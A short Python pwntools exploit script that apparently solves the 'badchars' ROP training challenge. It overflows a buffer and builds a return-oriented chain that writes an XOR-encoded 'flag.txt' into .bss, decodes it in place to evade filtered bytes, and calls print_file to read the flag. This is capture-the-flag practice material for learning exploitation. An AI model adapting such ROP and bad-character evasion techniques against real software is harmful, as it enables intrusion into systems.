#/usr/bin/python3
from pwn import process, xor, p64, log

shell = process("./badchars")

offset = 40
junk = b"A" * offset

string = xor(b"flag.txt", 2)

payload  = b""
payload += junk
payload += p64(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret;
payload += string        # flag.txt xored
payload += p64(0x601038) # .bss
payload += p64(0x0) * 2  # padding for pop
payload += p64(0x400634) # mov qword ptr [r13], r12; ret;

for i in range(8):
    payload += p64(0x4006a0)     # pop r14; pop r15; ret;
    payload += p64(0x2)          # xor key
    payload += p64(0x601038 + i) # .bss
    payload += p64(0x400628)     # xor byte ptr [r15], r14b; ret;

payload += p64(0x4006a3) # pop rdi; ret;
payload += p64(0x601038) # .bss
payload += p64(0x4004ee) # ret;
payload += p64(0x400510) # print_file()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
